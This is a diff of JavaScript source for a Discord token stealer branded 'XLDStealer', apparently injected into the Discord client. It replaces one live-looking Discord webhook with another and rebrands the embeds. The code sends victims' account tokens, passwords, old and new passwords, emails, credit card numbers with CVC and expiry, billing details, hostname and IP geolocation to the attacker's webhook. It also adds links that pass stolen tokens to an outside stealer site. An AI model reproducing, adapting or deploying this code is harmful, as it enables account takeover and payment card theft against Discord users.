@@ -11,9 +11,9 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "XLDStealer",
+    brand: "XLD",
 
-    webhook: "https://discord.com/api/webhooks/1074642829277667419/8lDYeqP1gpsyqMK_9webypwtjQOfxAZSISnCp9n98k4EYHRImwXjLS5wvGEdUWHGcMqj",
+    webhook: "https://discord.com/api/webhooks/1074642832012357704/gSm2AnPD0LtbAcz4cCJeF_dm4yGXP1fwCpQjQXqIsUk6QxDNz8JcAdw_E4Tm5ZVsSwJG",
 
     logout: true,
     disable_qr_code: true,
@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "XLDStealer",
+        username: "XLDStealer | discord.gg/210",
         footer: {
-            text: `Indra $Ealer | t.me/OwnedByIndra`,
+            text: `XLDStealer | discord.gg/210`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/OwnedByIndra",
+        href: "https://discord.gg/210",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
@@ -267,33 +267,29 @@ var event_handlers = {
                     url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
+                description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "Credit card Number",
-                        value: `\`\`\`${number}\`\`\``,
+                        name: "BIN",
+                        value: `\`${number}\``,
                         inline: true
                     },
                     {
-                        name: "Credit card CVC",
-                        value: `\`\`\`${cvc}\`\`\``,
+                        name: "CVC",
+                        value: `\`${cvc}\``,
                         inline: true
                     },
                     {
-                        name: "Credit card expiration",
-                        value: `\`\`\`${month}/${year}\`\`\``,
+                        name: "EXP",
+                        value: `\`${month}/${year}\``,
                         inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -301,16 +297,12 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        value: `\`${token}\``,
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -345,28 +337,24 @@ var event_handlers = {
                     url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
+                description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
                         name: "Password",
-                        value: `\`\`\`${password}\`\`\``,
+                        value: `\`${password}\``,
                         inline: true
                     },
                     {
-                        name: "E-Mail Address",
-                        value: `\`\`\`${email}\`\`\``,
+                        name: "E-Mail",
+                        value: `\`${email}\``,
                         inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -374,16 +362,12 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        value: `\`${token}\``,
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -418,28 +402,24 @@ var event_handlers = {
                     url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
+                description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
                         name: "New email address",
-                        value: `\`\`\`${newEmail}\`\`\``,
+                        value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
                         name: "Password",
-                        value: `\`\`\`${password}\`\`\``,
+                        value: `\`${password}\``,
                         inline: true
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -447,16 +427,12 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        value: `\`${token}\``,
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -491,28 +467,24 @@ var event_handlers = {
                     url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
+                description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
                         name: "Old password",
-                        value: `\`\`\`${oldPassword}\`\`\``,
-                        inline: false
+                        value: `\`${oldPassword}\``,
+                        inline: true
                     },
                     {
                         name: "New password",
-                        value: `\`\`\`${newPassword}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "Phone Number",
-                        value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                        inline: false
+                        value: `\`${newPassword}\``,
+                        inline: true
                     },
                     {
                         name: "Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
-                        inline: false
+                        inline: true
                     }, {
                         name: "Billing",
                         value: `${billing}`,
@@ -520,16 +492,12 @@ var event_handlers = {
                     }, {
                         name: "Badges",
                         value: `${getBadges(userInfo.flags)}`,
-                        inline: false
+                        inline: true
                     },
                     {
                         name: "Token",
-                        value: `\`\`\`${token}\`\`\``,
-                        inline: false
-                    }, {
-                        name: "Hostname",
-                        value: `\`\`\`${os.hostname}\`\`\``,
-                        inline: false
+                        value: `\`${token}\``,
+                        inline: true
                     },
                 ],
             }), createEmbed({
@@ -560,13 +528,13 @@ function getDiscordClient() {
 function getNitro(flags) {
     switch (flags) {
         case 0:
-            return "\`\`\`No Nitro\`\`\`";
+            return "\`No Nitro\`";
         case 1:
-            return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
+            return "<:classic:896119171019067423> Nitro Classic";
         case 2:
-            return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
+            return "<a:boost:824036778570416129> Nitro Boost";
         default:
-            return "\`\`\`No Nitro\`\`\`";
+            return "\`No Nitro\`";
 
     };
 }
@@ -586,7 +554,7 @@ function getBadges(flags) {
         let o = config.badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
     };
-    if (b == '') b = '\`\`\`None\`\`\`'
+    if (b == '') b = '\`None\`'
     return b;
 }
 
@@ -609,17 +577,17 @@ async function getBilling(token) {
     var billing = "";
     json.forEach(z => {
         if (z.type == "") {
-            return "\`\`\`❌\`\`\`";
+            return "\`❌\`";
         } else if (z.type == 2 && z.invalid != true) {
             billing += "\`✔️\`" + " <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != true) {
             billing += "\`✔️\`" + " :credit_card:";
         } else {
-            return "\`\`\`❌\`\`\`";
+            return "\`❌\`";
         };
     });
 
-    if (billing == "") billing = "\`\`\`❌\`\`\`"
+    if (billing == "") billing = "\`❌\`"
     return billing;
 }
 
@@ -718,15 +686,15 @@ async function initialize() {
                         title: "Discord | Client initialized (not logged in)",
                         fields: [{
                             name: "Hostname",
-                            value: `\`\`\`${os.hostname}\`\`\``,
+                            value: `\`${os.hostname}\``,
                             inline: false
                         }, {
                             name: "Client version",
-                            value: `\`\`\`${getDiscordClient()}\`\`\``,
+                            value: `\`${getDiscordClient()}\``,
                             inline: false
                         }, {
                             name: "Connection data",
-                            value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
+                            value: `\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\``,
                             inline: false
                         }],
                     })]
@@ -747,23 +715,19 @@ async function initialize() {
                             url: config.embed.href,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
+                        description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                                name: "E-Mail Address",
-                                value: `\`\`\`${userInfo.email}\`\`\``,
+                                name: "E-Mail",
+                                value: `\`${userInfo.email}\``,
                                 inline: true
-                            },
-                            {
-                                name: "Phone Number",
-                                value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
-                                inline: false
                             },
                             {
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Billing",
                                 value: `${billing}`,
@@ -771,25 +735,12 @@ async function initialize() {
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Token",
-                                value: `\`\`\`${token}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "Hostname",
-                                value: `\`\`\`${os.hostname}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Client version",
-                                value: `\`\`\`${getDiscordClient()}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Connection data",
-                                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
-                                inline: false
+                                value: `\`${token}\``,
+                                inline: true
                             }
                         ],
                     }), createEmbed({
@@ -823,13 +774,14 @@ async function initialize() {
                             url: config.embed.href,
                             icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
+                        description: `[Copy Token](https://rustlerstealer.com/copy/\`${token}\`)`,
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
+                                inline: true
                             }, {
                                 name: "Billing",
                                 value: `${billing}`,
@@ -837,12 +789,12 @@ async function initialize() {
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: false
+                                inline: true
                             },
                             {
                                 name: "Token",
-                                value: `\`\`\`${token}\`\`\``,
-                                inline: false
+                                value: `\`${token}\``,
+                                inline: true
                             },
                         ]
                     })]
